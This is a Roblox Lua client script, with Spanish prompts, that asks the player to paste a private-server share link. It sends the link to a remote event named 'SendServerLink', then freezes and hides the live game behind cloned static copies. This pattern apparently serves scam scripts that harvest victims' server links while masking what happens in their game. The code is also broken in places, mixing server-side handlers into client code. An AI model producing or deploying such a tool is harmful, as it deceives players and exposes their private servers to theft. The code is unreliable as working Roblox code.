local Player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local SoundService = game:GetService("SoundService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")

-- ====== UI ======
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = Player:WaitForChild("PlayerGui")
ScreenGui.DisplayOrder = 100

local Frame = Instance.new("Frame")
Frame.Parent = ScreenGui
Frame.Size = UDim2.new(0, 400, 0, 300)
Frame.Position = UDim2.new(0.5, -200, 0.5, -150)
Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)

local Label = Instance.new("TextLabel")
Label.Parent = Frame
Label.Size = UDim2.new(1, -20, 0, 30)
Label.Position = UDim2.new(0, 10, 0, 10)
Label.Text = "Ingresa el link de tu servidor privado:"
Label.TextColor3 = Color3.fromRGB(255, 255, 255)
Label.BackgroundTransparency = 1

local TextBox = Instance.new("TextBox")
TextBox.Parent = Frame
TextBox.Size = UDim2.new(1, -20, 0, 50)
TextBox.Position = UDim2.new(0, 10, 0, 50)
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
TextBox.ClearTextOnFocus = false
TextBox.Text = "https://www.roblox.com/share?code="

local MessageLabel = Instance.new("TextLabel")
MessageLabel.Parent = Frame
MessageLabel.Size = UDim2.new(1, -20, 0, 30)
MessageLabel.Position = UDim2.new(0, 10, 0, 110)
MessageLabel.BackgroundTransparency = 1
MessageLabel.Text = ""
MessageLabel.TextColor3 = Color3.fromRGB(255, 0, 0)

local Button = Instance.new("TextButton")
Button.Parent = Frame
Button.Size = UDim2.new(1, -20, 0, 50)
Button.Position = UDim2.new(0, 10, 0, 150)
Button.Text = "Enviar"
Button.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Button.TextColor3 = Color3.fromRGB(255, 255, 255)

local MiniButton = Instance.new("TextButton")
MiniButton.Parent = ScreenGui
MiniButton.Size = UDim2.new(0, 100, 0, 30)
MiniButton.Position = UDim2.new(0, 20, 0, 20)
MiniButton.Text = "Abrir ventana"
MiniButton.Visible = false
MiniButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
MiniButton.TextColor3 = Color3.fromRGB(255, 255, 255)

MiniButton.MouseButton1Click:Connect(function()
    Frame.Visible = true
    MiniButton.Visible = false
end)

-- ====== Validación del link ======
local function isLinkValid(link)
    local startPart = "https://www.roblox.com/share?code="
    local endPart = "&type=Server"
    return string.sub(link, 1, #startPart) == startPart and string.sub(link, -#endPart) == endPart
end

-- ====== Detener todos los datos del juego ======
local function stopAllGameData()
    -- 1) Detener todos los sonidos
    local function stopSoundsIn(parent)
        for _, obj in pairs(parent:GetDescendants()) do
            if obj:IsA("Sound") then
                pcall(function() obj:Stop() end)
                obj.Volume = 0
                obj:Destroy() -- Eliminar el sonido para que no se reinicie
            end
        end
    end
    stopSoundsIn(Workspace)
    stopSoundsIn(SoundService)

    -- 2) Detener todos los NPCs y personajes
    local function stopCharacters()
        for _, character in pairs(Workspace:GetDescendants()) do
            if character:IsA("Model") and character:FindFirstChildOfClass("Humanoid") then
                local humanoid = character:FindFirstChildOfClass("Humanoid")
                humanoid:ChangeState(Enum.HumanoidStateType.Physics)
                for _, anim in pairs(humanoid:GetPlayingAnimationTracks()) do
                    anim:AdjustSpeed(0)
                end
                humanoid.WalkSpeed = 0
                humanoid.JumpPower = 0
            end
        end
    end
    stopCharacters()

    -- 3) Detener todos los eventos
    local function stopEvents()
        local stopEventsEvent = Instance.new("RemoteEvent")
        stopEventsEvent.Name = "StopAllEvents"
        stopEventsEvent.Parent = ReplicatedStorage

        stopEventsEvent:FireServer()
    end
    stopEvents()

    -- 5) Congelar el entorno
    local frozenFolder = Instance.new("Folder")
    frozenFolder.Name = "FrozenCopies"
    frozenFolder.Parent = Workspace

    for _, obj in pairs(Workspace:GetDescendants()) do
        if obj:IsA("BasePart") or (obj:IsA("Model") and obj:FindFirstChildOfClass("Humanoid")) then
            local clone = obj:Clone()
            clone.Name = "FrozenCopy_" .. obj.Name
            for _, desc in pairs(clone:GetDescendants()) do
                if desc:IsA("Script") or desc:IsA("LocalScript") or desc:IsA("Animator") then
                    desc:Destroy()
                end
                if desc:IsA("ParticleEmitter") or desc:IsA("Trail") or desc:IsA("Sound") then
                    desc.Enabled = false
                    if desc:IsA("Sound") then
                        pcall(function() desc:Stop() end)
                        desc.Volume = 0
                        desc:Destroy() -- Eliminar el sonido para que no se reinicie
                    end
                end
                if desc:IsA("BasePart") then
                    desc.Anchored = true
                    desc.CanCollide = false
                end
            end
            if clone:IsA("Model") then
                for _, part in pairs(clone:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.Anchored = true
                        part.CanCollide = false
                    end
                end
                if clone.PrimaryPart then
                    clone:SetPrimaryPartCFrame(obj:GetPrimaryPartCFrame())
                end
            elseif clone:IsA("BasePart") then
                clone.CFrame = obj.CFrame
            end
            clone.Parent = frozenFolder

            if obj:IsA("BasePart") then
                pcall(function() obj.LocalTransparencyModifier = 1 end)
            elseif obj:IsA("Model") then
                for _, p in pairs(obj:GetDescendants()) do
                    if p:IsA("BasePart") then
                        pcall(function() p.LocalTransparencyModifier = 1 end)
                    end
                end
            end

            if obj:IsA("Model") then
                local humanoid = obj:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid:ChangeState(Enum.HumanoidStateType.Physics)
                    for _, anim in pairs(humanoid:GetPlayingAnimationTracks()) do
                        anim:AdjustSpeed(0)
                    end
                    humanoid.WalkSpeed = 0
                    humanoid.JumpPower = 0
                end
            end
        end
    end

    -- 6) Detener datos del juego
    RunService.Stepped:Connect(function()
        for _, obj in pairs(Workspace:GetDescendants()) do
            if obj:IsA("BasePart") or (obj:IsA("Model") and obj:FindFirstChildOfClass("Humanoid")) then
                if obj:IsA("BasePart") then
                    obj.Velocity = Vector3.new(0, 0, 0)
                    obj.AngularVelocity = Vector3.new(0, 0, 0)
                elseif obj:IsA("Model") then
                    for _, part in pairs(obj:GetDescendants()) do
                        if part:IsA("BasePart") then
                            part.Velocity = Vector3.new(0, 0, 0)
                            part.AngularVelocity = Vector3.new(0, 0, 0)
                        end
                    end
                end
            end
        end
    end)

    -- 7) Detener la aparición de nuevos NPCs
    local function onChildAdded(child)
        if child:IsA("Model") and child:FindFirstChildOfClass("Humanoid") then
            local humanoid = child:FindFirstChildOfClass("Humanoid")
            humanoid:ChangeState(Enum.HumanoidStateType.Physics)
            for _, anim in pairs(humanoid:GetPlayingAnimationTracks()) do
                anim:AdjustSpeed(0)
            end
            humanoid.WalkSpeed = 0
            humanoid.JumpPower = 0
        end
    end

    Workspace.ChildAdded:Connect(onChildAdded)
end

-- ====== Botón principal ======
Button.MouseButton1Click:Connect(function()
    local link = TextBox.Text
    if isLinkValid(link) then
        MessageLabel.Text = "El link es válido ✅"
        MessageLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
        local remoteEvent = ReplicatedStorage:FindFirstChild("SendServerLink")
        if remoteEvent then
            remoteEvent:FireServer(link)
        end
        stopAllGameData()
        Frame.Visible = false
        MiniButton.Visible = true
    else
        MessageLabel.Text = "El link es inválido ❌"
        MessageLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    end
end)

-- Script en el servidor para manejar la detención de eventos
local function onStopAllEvents()
    for _, event in pairs(ReplicatedStorage:GetChildren()) do
        if event:IsA("RemoteEvent") or event:IsA("RemoteFunction") then
            event:FireAllClients()
        end
    end
end

ReplicatedStorage:WaitForChild("StopAllEvents").OnServerEvent:Connect(onStopAllEvents)
